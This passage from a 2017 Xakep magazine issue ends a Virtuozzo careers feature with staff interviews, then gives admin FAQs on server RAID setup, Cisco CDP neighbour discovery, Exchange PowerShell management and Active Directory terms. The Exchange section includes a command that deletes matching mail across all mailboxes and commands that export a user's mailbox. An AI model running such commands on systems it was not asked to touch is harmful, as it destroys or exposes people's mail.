информацию из разных источников: для существующих продук тов это прежде
всего общение с заказчиками и теми, кто мог бы ими стать, для новых и пер‐
спективных про дуктов — анализ рынка, проб лем потенциальных клиентов
и решений кон курентов. Основная цель подобного планирования — это стро‐
ить продукт, который может быть успешен на рынке, который компания может
продавать и зарабатывать на этом.
  Обрабатывать пожелания  пользователей не  так просто,  как может
показаться; пер вое, что нужно понять, когда клиент просит добавить ту
или иную фичу, — это какую проблему он пытается с ее помощью решить
и насколько эта проблема уникальна для конкрет ного клиента. Мы стараемся
избегать ситуаций, когда мы добавляем новую функцию, а клиент говорит:
«Это не работает, вы неправильно сделали, я имел в виду не это». Нужно убе‐
диться, что та фича, которую он предлагает, — это действительно решение.
Или, возможно, нужно что‐то другое. Мы знаем продукт изнутри и часто
можем предложить решение, связанное, например, с внешней интеграцией,
с вызовом продукта из командной строки, через API и тому подобное. В слу ‐
чаях, когда проблема данного клиента уникальна и другим такое не нужно,
это обычно самый правильный способ.
  В подобных ситуациях, если клиент хочет что‐то, что нужно только ему,
и это не конфликтует с общей стратегией развития продук та, может быть
еще один вариант. У нас есть небольшая коман да, которая может делать
для конкретного клиента какие‐то настройки, кастомизировать какие‐то вещи
в продукте или связанные с продуктом. Мы называ ем это professional services.
Мы не та компания, которая дела ет индивидуальные решения для каждого
клиента, но если заказчик большой и финансово это имеет смысл, то можем
построить и поддерживать что‐то специально для него.
   У меня сейчас работа ет пять програм‐менеджеров, каждый из них ведет
свой проект или подпроект. Они обща ются с разработчиками, с тестиров‐
щиками и с техническими писателями, делают так, чтобы членам команды
было понятно, чем заниматься ему и чего от него ждут осталь ные. Для это го
нужно постоянно быть в центре событий. Если посмотришь на мою команду,
то увидишь, что это сот рудники, которые бегают по офису больше всех,
которые собирают встречи, которые записы вают всё, о чем мы договорились,
документируют разные требования и так далее. Для них важно иметь навыки
именно общения и работы с людьми, в частности решения конфлик тов.
Интроверту или кон фликтному человеку на этой работе пришлось бы неп‐
росто.
   Если программисту нужен впол не конкретный набор умений и навыков, то
для програм‐менеджера часто воз можны варианты. Это может быть человек,
который достаточно глубоко разбирается в технологиях, или же человек,
который вносит свою лепту в понимание потребностей рынка, доверяет тем,
кто разбирается в технологиях.
  Конечно, не разбираться в технологиях вообще невозможно. Не имея
никаких технических навыков, очень сложно заслужить уважение разработ‐
чиков. Они не будут воспринимать такого менед жера как человека, с которым
нужно говорить серьезно, который понимает, в чем их проб лемы, и помогает
найти решения. Глубина понимания может быть разной, но оно требуется
в любом случае. Кроме того, технические навыки важны, потому что прог‐
рам‐менеджеры должны понимать, может ли предложенное тех ническое
решение реально устранить проблему. Не понимая, как работает технология,
очень тяжело предположить, когда она подойдет для решения проблемы
и когда — нет.
   У меня в коман де есть как люди, которые раньше работали у нас на других
дол жностях, так и те, что пришли со стороны. Я сам успел поработать тес‐
тировщиком, программистом и менеджером проекта, прежде чем попасть
в програм‐менеджеры. Один человек в моей коман де пришел из тестиров‐
щиков, еще двое — с разных ролей в дру гих компаниях.
   Характерно, что исторически в нашу команду чаще попадают люди из тес‐
тирования или поддержки, а не из разработчиков. В этих должностях у сот‐
рудников достаточно кругозора, чтобы видеть, какие проблемы возникают
у пользователей и какие проблемы они пытаются решать с помощью нашего
софта. Программист же чаще погружен в решение тех нических проблем,
и ему, чтобы подходить для этой роли, нужно каким‐то образом выйти из этих
рамок и научиться смот реть на вещи со стороны, прежде всего глазами
заказчика.





            Дарт Вейдер готовит ся угнетать врагов Virtuozzo

А теперь настало время познакомиться с человеком, который заменяет
собой целую команду, — Павлом Емельяновым. Он главный архитектор Vir‐
tuozzo, и именно благодаря его ста раниям теперь ядро Linux официально
обзавелось CRIU (Checkpoint/Restore In Userspace) — софтом, позволяющим
создать извне во время выпол нения произвольной программы контрольную
точку с возможностью возоб новления работы программы с этой точки, в том
числе в другом экземпляре операционной системы.


ПАВЕЛ ЕМЕЛЬЯНОВ, ГЛАВНЫЙ АРХИТЕКТОР VIRTUOZZO

     Работа: раз работчик ядра Linux
     Уровень сложности (сложно ли попасть): IMPOSSIBLE
     Необходимые знания: зна ние C и ядра Linux, левита ция, телекинез
     Что получишь кроме денег: полное погружение в любимую работу,
      зна комс тва в сообщес тве, опыт решения нетривиальных задач
     Карьерные возможности: раз работчик ядра Linux

Если ты посмотришь на соседние команды, то обнаружишь, что они на сто
процентов поглощены развитием и поддержкой существующих продук тов.
Новые вещи там, конечно, тоже дела ют, но это лишь новые версии про дуктов,
разработка и внедрение чего‐то нового. Или взять, например, ядерную
команду: она переносит наши ядерные разработки на всё новые ядра Linux
и решает связанные с этим задачи. Это интересная работа, но революцион‐
ного прорыва в ней нет: все знают, что такое ядро и что с ним делать. У меня
же оседают все особен ные, нетипич ные и неизведанные вещи.





                       Павел Емельянов

Для примера расскажу историю появления CRIU. Изначально все модифи‐
кации Virtuozzo не шли в основную вет ку ядра (так называемый upstream) — то
есть в ядро Linux. Они были открытыми, но это, по сути, у нас была своя собс‐
твенная ветка ядра. В какой‐то момент мы начали отправлять всю эту
функциональность Линусу Торвальдсу. Так появились подсисте мы cgroups
и namespaces, которыми сейчас все пользуются. А еще был третий ком‐
понент — живая миграция, которая у нас была целиком в ядре. Чем‐то
похожим занимались не только мы, но и IBM и еще несколько исследователей
из Колумбийско го университета.
  Несколько лет команда разработ чиков ядра не принимала эти патчи: все
говорили, что это слишком большая подсистема, которая выворачивает наиз‐
нанку все ядро. Вы, мол, пока работайте, но отдельно от нас. Постепенно мы
стали вытаскивать некоторые компоненты наружу, в user space. То есть была
утилита, которая дергала один‐единственный вызов в ядре, типа восста‐
новить или сохранить. Но вытащить все в user space невозможно, и мы про‐
дол жали писать патчи для ядра.
  В какой‐то момент Линусу все это надоело, и он сказал: «Все, дальше
можете даже не пытаться, я это брать не буду». Тогда я решил попробовать
вынести в пользовательское пространство максимум. И написал прототип,
который впоследствии и превратил ся в CRIU. Не помню, сколько в нем было
строк, но даже тысячи, кажет ся, не набиралось. Он сохранял и восстанав‐
ливал программку, которая работа ла с открытым файлом. У нее не было
ни сокетов, ни пайпов, ни сигналов, никаких хит рых отображений в памяти —
несколь ко небольших патчей для получения о процессе то ли памяти, то ли
регистров и для создания процесса с заданным идентификатором (PID).
Это можно было сделать в режиме отладчика, но тогда операции происхо ‐
дили бы побайтово, а мне была важна скорость. В общем, в результате
появилось два патча и та малюсенькая программулинка. Народ посмотрел
и решил, что это интересно — всего два патча, а возможностей откры вает ся
масса. Попросили развить эту идею.
   Тут началась та же история, что и с попыт кой занести все в ядро. Я
добавил что‐то еще — пайпы в том числе. Потом мне сказали: «Зачем тебе
модифицировать proc‐файл для доставания памяти, доставай как отладчик».
Мы переделали это, я тогда подключил к работе еще одного сотрудника.
  По сути, это был мой собственный проект, потому что в Virtuozzo ник то
не считал, что мой план сработа ет, а я тратил на это много времени. Мне
советовали оставить это дело: раз не идет в ядро, значит, будем реализовы‐
вать при помощи модулей, нам не сложно. В общем, года два ник то не при‐
нимал эту затею всерьез. А потом случился какой‐то переломный момент.
  На одной из конференций ко мне подошел один известный мейнтейнер
ядра — Эндрю Мортон. Он спросил: «Долго вы еще будете всем этим
заниматься‐то? Может, релиз сделаете, я бы все эти патчи тогда взял
и Линусу сдал в ядро». Они постоянно расширя ют ядерный интерфейс,
и наши наработки ока зались бы полезными для всех.
   Так мы сделали CRIU 0.1. Мортон влил патчи в ядро, об этом были написа‐
ны статьи, я выступил на конференции с докладом. Тогда в Virtuozzo поняли,
что, видимо, мы наконец‐то выкинем из нашего ядра checkpoint restore (это та
самая живая миграция) и перейдем на мой вариант. Так CRIU перестал быть
моим pet project и стал поддерживаться официально.
  Коман ды как таковой у меня сейчас нет: когда нужны лишние руки, чтобы
что‐то сделать, мне при ходит ся звать людей из других про ектов. Либо заин‐
тересовывать их тем, чем я занимаюсь, либо, как было в случае с живой миг‐
рацией, мои нужды совпадают с интереса ми какой‐то из команд и тогда они
подключаются. Но если кто‐то из читателей «Хакера» чувствует, что хочет
заниматься тем же, чем и я, то буду рад поговорить с этим человеком.


АЛЕКСЕЙ КОБЕЦ, СТАРШИЙ ВИЦЕ-ПРЕЗИДЕНТ ПО РАЗРАБОТКЕ
VIRTUOZZO

     Работа: стар ший вице‑пре зидент по раз работке Virtuozzo
     Уровень сложности (сложно ли попасть): IMPOSSIBLE

В нашей команде 90 человек. У нас есть несколько функций, но основная —
это девелопмент, ее выполняет отдел разработки. Там есть разработчики,
там есть тестировщики, там есть програм‐менеджмент, есть техрайтеры,
которые описывают все фичи продуктов. Также у нас есть отдел, который
занимается пер спективными разработками. Это ключевые отделы, которые
вместе создают наши продукты.
   Если высшего образования у кандидата нет, но есть опыт, мы обязательно
поговорим с ним и, возможно, возьмем. В первую очередь нужно разбирать‐
ся в ядре ОС. Если ты успел засветиться в сообществе и занимаешься
вещами, связан ными с производительностью, с разработкой гостевых драй‐
веров, с разработкой систем виртуализации, то это огромный плюс. В пос‐
леднее время мы сильно фокусируемся на средствах управле ния и на UI/UX,
такие знания будут по достоинству оценены на собеседовании.





                           Алексей Кобец

Мы  работаем  с  несколькими  вузами,  есть  сту денческие  программы
и интернатура. Начинать можно оттуда. Сту ден ты, к примеру, занимаются
CRIU. Через один‐два года стажировки сту денты приходят к нам на полный
рабочий день и подключают ся к серьезным разработкам. Если посмотреть
на команду, у нас достаточно много людей прошли такой путь, в том числе и я
сам.
  Недавно заметили, что студенты на ста жировку к нам идут труд нее. Начали
разбираться почему, оказалось, что просто стали мало выдавать для дип‐
ломов тем с математикой. А куда на физтехе без математики? Шанс
защититься куда меньше. От этого и сту денты стали меньше брать наши
темы.
   Что касается условий работы: я считаю, что мы все должны работать
в офисе. На самом деле практика показы вает, что многие задачи в офисе
решаются быстрее и эффективнее. Рабочий день ненормированный. День
начинается в одиннадцать, а заканчивается очень поздно, потому что мы
работаем с Америкой и нужно, чтобы мы пересекались с клиентами по часам.
Тестеры и разработчики должны обязательно работать в одно и то же время.
Чтобы не допускать абсурда, когда тестер нашел ошибку, а разработчика нет,
приходит разработчик, воспроизвести не может, а тестера уже нет.
FAQ




                                        Алексей Zemond
                                           Панкратов
                                           3em0nd@gmail.com

FAQ
     ответы на вопросы
         читателей

                 (Есть вопросы? Шли на FAQ@GLC.RU)





      КАК СДЕЛАТЬ ПЕРВОНАЧАЛЬНУЮ НАСТРОЙКУ
      СЕРВЕРНОГО RAID (НА ПРИМЕРЕ СЕРВЕРА LENOVO)
       Настройка RAID — стандартная процедура для новых серверов.1        Если ты не работаешь в дата‐центре или в какой‐нибудь крупной
        компании‐интегра торе, то чаще всего тебе придется сталкиваться
        с уже настроенными массивами. Но случается и так, что в руки
        попадает новенький сервер, который требует первоначальной нас‐
        тройки. Мне, к примеру, достался Lenovo x3650 M4. Сейчас на его
        примере посмотрим, как настроить RAID 10 из восьми жестких дис‐
         ков.
         По большому счету, если не лезть в тонкие настройки, то все
        более‐менее тривиально. Нужно выбрать необходимый тип RAID,
        определиться с количеством жестких дисков и применить изме‐
         нения. После этого можно разбивать пространство на логические
        диски и ставить операционку.
         При загрузке любого сервера система сама подскажет, что
        нажимать, чтобы попасть в настройки. Это можно сделать как через
       меню BIOS, так и сразу вызвав при загрузке специальную утилиту.
        У каждого производителя она завяза на на разные сочетания кно‐
        пок — следи за подсказками на экране или обратись к докумен‐
         тации.
         Попав в настройки RAID, первым делом выбираем наш контрол‐
         лер.





                        Конфигура ция контроллера

        Если походить по меню, то можно убедиться, что параметров
        огромное количество. В Controller Management → View Controller In‐
         formation ты можешь посмотреть общую информацию вроде серий‐
        ного номера, опций шифрования и номера сло та. В пункте Controller
       Management → Change Controller Properties — поменять настройки
        контрол лера.
         Нам же в первую очередь нужен пункт Virtual Drive Management.
       Сначала там будет только один пункт меню — Create Conﬁguration.
       Выбрав его, первым делом задаем тип RAID.





                            Создаем RAID

       После этого нужно сделать два span, один из которых станет зер‐
        калом. Учитывая, что у меня восемь дисков, в первый span добав‐
        ляем первые четыре, а оставшиеся, соответственно, во вто рой.





                       Проверя ем конфигурацию

        Теперь разреша ем программе спокойно уничтожать все данные
        на диске и ждем, когда закончится процесс создания RAID. После
        этого он готов к использованию.


      КАК ИСКАТЬ СОСЕДНИЕ УСТРОЙСТВА CISCO ПРИ
     ПОМОЩИ CDP
         Cisco Discovery Protocol (CDP) — это проприетарный протокол2         Cisco, который позволя ет сетевым устройствам анонсировать в сеть
       информацию о себе и о своих возможностях, а так же получать
       информацию о соседних устройствах.
          Это весь ма полезный и в то же время опасный протокол. С его
       помощью можно получить информацию обо всех соседних устрой‐
         ствах. Полезно это может быть как сисадмину — для поиска необ ‐
        ходимого маршрутиза тора, так и злоумышленнику — для изучения
         атакуемой сети. Поэтому на пор тах, которые смот рят наружу, CDP
       обычно отклю чают.
          Для просмотра соседей используется коман да show cdp neigh‐
        bors. Ответ будет выглядеть как таблица.


        Capability Codes: R ‐ Router, T ‐ Trans Bridge, B ‐ Source
        Route Bridge
                          S ‐ Switch, H ‐ Host, I ‐ IGMP, r ‐
        Repeater, P ‐ Phone
        Device ID        Local Intrfce     Holdtme    Capability
        Platform  Port ID
        sw1              Fas 0/6           178           S I      WS‐
        C3560‐ Fas 0/9
        sw1              Fas 0/1           171           S I      WS‐
        C2960‐ Fas 0/24





        Чтобы получить более детальную информацию о соседях, нужно
        добавить в команду параметр detail:


        show cdp neighbors detail

      Вывод будет подробнее:


        CDP neighbors information
          Port : 1
          Device ID : sw1


          Address Type : IP
          Address      : 192.168.0.109


          Platform     : Cisco IOS Software, C3550 Software (C3550‐
        IPSERVICESK9‐M)
          Capability   : Switch


          Device Port  : FastEthernet0/9


          Version      : Cisco IOS Software, C3550 Software (C3550‐
        IPSERVICESK9‐M)

        Здесь отображается IP железки, версия IOS, а также прописаны
        порты на обоих концах, что весьма удобно, когда нужно найти опре‐
        делен ный кабель.
        CDP работает на втором уровне модели OSI, и в общих чертах
        его механизм устроен следующим образом. Устройство посылает
        мультикаст‐анонс на MAC‐адрес 01‐00‐0c‐cc‐cc‐cc. В конфиге
        по умолчанию стоит рассылка анонсов каждые 60 с на порты Ether‐
          net, Frame Relay и ATM. Устройство, которое понимает эти анонсы,
        сохраня ет их в CDP‐таблицу. В том слу чае, если устройство трижды
        не прислало анонс, оно автоматически удаляется из таблицы.
         Посмотреть настройки протокола можно командой show  cdp.
        Результат выпол нения будет выглядеть примерно так:


        Global CDP information:
                Sending CDP packets every 60 seconds
                Sending a holdtime value of 180 seconds
                Sending CDPv2 advertisements is enabled
                Source interface is Loopback0

       Для смены значений (например, частоты отправки сообщений CDP)
        используем команду cdp timer 10.
         Поскольку CDP — это протокол Cisco, то при использовании его
        в сетях с оборудованием разных брендов нужно быть готовым
          к тому, что списки соседей будут отображаться не полностью. К при‐
        меру, коммутаторы 3COM и D‐Link не сильно дружат с CDP, а вот
          MikroTik весьма успешно соседствуют с Cisco.


      УПРАВЛЯЕМ EXCHANGE ЧЕРЕЗ POWERSHELL
       Подключаться  к серверу Exchange и управлять почтой можно
        не только через поч товик, но и напрямую из PowerShell. Это поз‐3
        воляет писать самые разные скрипты — например, массово соз‐
        давать ящики или переносить архивы. Посмотрим, как выглядит этот
        интерфейс.
         Первым делом нужно уста новить сессию с сервером. Для этого
        используем следующий командлет:


        С:> $session = New‐PSSession ‐ConfigurationName Microsoft.
        Exchange ‐ConnectionUri http://mx.mailserver.ru ‐Authen
        tication Kerberos

       Вместо http://mx.mailserver.ru указываем URI своего сервера
         (его можно гля нуть в Exchange Admin Center в разделе «Серверы →
       Виртуальные директории»). Теперь используем нашу сессию:


        С:> Import‐PSSession $session ‐DisableNameChecking

       После этого можно начинать вводить коман ды Exchange Manage‐
        ment Shell. К примеру, для того чтобы посмотреть, сколько места
        занимает каждая папка, выпол ним:


        Get‐MailboxFolderStatistics ‐Identity <user> ‐FolderScope All
         | select Name,ItemsInFolder,FolderSize

       Поиск и удаление писем по теме и вложению:


        Get‐Mailbox ‐ResultSize unlimited | Search‐Mailbox ‐Search
        Query вложение:"archive.exe" ‐DeleteContent

      Вывести ящики, которые не использовались за последние 120 дней:


        Get‐MailboxDatabase | Get‐MailboxStatistics | where {$_.
        Lastlogontime ‐lt (get‐date).AddDays(‐120)} | Sort Lastlog

       Экспортировать почтовый ящик в формате PST:


        New‐MailboxExportRequest ‐Mailbox "xakep" ‐Filepath "PCtemp
        xakep.pst" ‐ContentFilter {(Received ‐gt "01/01/2017")}
        New‐MailboxExportRequest ‐Mailbox "xakep" ‐Filepath "PCtemp
        xakep.pst"

        Как видишь, разных команд и воз можностей сколько угодно. Под‐
        робнее о них можешь почитать в официальном источнике, ну и не
        забывай про встроенную справку по синтаксису язы ка, она часто
        выручает.





                         Exchange Management Shell


      РАЗБИРАЕМСЯ С ДЕРЕВЬЯМИ В ЛЕСУ, ИЗУЧАЯ
      ТЕРМИНОЛОГИЮ ACTIVE DIRECTORY
       Впервые услышав термины «лес», «деревья» и связанные с ними4        «доверитель ные отношения», недол го и испу гаться. Не меньше
         пугает и сама Active Directory, недаром слывущая одной из самых
        сложных  технологий  Microsoft.  Чтобы  успешно  управлять AD
        и понимать, что там происходит, следует первым делом изу чить
        базовую терминологию и понять, как компоненты связаны между
        собой. Об этом я и расскажу.
         Высший уровень логической иерархии AD — это лес. Лесом
        называют пол ностью самостоятельную организацию Active Directory,
        которая имеет определенный набор атрибутов и явля ется перимет‐
       ром безопасности организации.
        В состав леса могут входить как один, так и несколько доменов.
       Все объекты, создаваемые внутри леса, имеют общий набор атри‐
         бутов. Например, объект «пользователь» содержит имя, фамилию,
        адрес, телефон, сведения о членстве в группах и другие параметры.
       Меняя этот набор, мы меня ем его для всех объектов леса. Такой
        набор называется схемой AD. Она описывает все объекты, которые
      мы можем создать, и их структуру.
         По умол чанию первый домен, который создан в лесу, считается
        его корневым доменом. Под доменом понимается логическая груп‐
        па пользователей и компьютеров, которые поддерживают центра‐
        лизованное администрирование и настройки безопасности. Домен
         также служит единицей для репликации — все контроллеры домена,
        которые входят в один домен, дол жны участвовать в репликации
         друг с другом.
         Домены принято именовать, используя пространство имен DNS.
        Доверие, в свою очередь, — это связь между двумя доменами,
        при которой устанавлива ются разрешения на доступ к тем или иным
       объектам другого домена. Дерево — не что иное, как набор
        доменов, которые используют связанные пространства имен. К при‐
        меру, если домен называется xakep.ru, то дочерний домен test будет
        выглядеть как test.xakep.ru. Резюмируя, можно условно нарисо вать
        такую схему: «Лес — дерево — домен».





                        Общая структура

       Чаще всего в орга низациях используют самую простую струк туру.
       Один лес и в нем кор невой домен, который содержит различные
       объекты, такие как пользователи и компьютеры. Развитая структура
        встречается в основном в крупных компаниях, с большим штатом
        ИТ‐специалистов и разными уров нями ответственности. Зачастую
        полные права есть лишь у архитекторов, а рядовые администраторы
       имеют права только в своих доменах.
        С первоначальной терминологией все. В одном из следующих
        выпусков расскажу о типах доверительных отношений.
                                    18+





  № 4 (219)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

        Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                                АРТ
                   Анна Королькова          Depositphotos.com
                        Верстальщик             Источник лицензионных
                     цифровой версии             фото и графики


                           РЕКЛАМА
                                 Анна Яковлева
                                   Директор по рекламе
                                          yakovleva.a@glc.ru


                 РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                     Подробная информация по подписке: paywall@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2017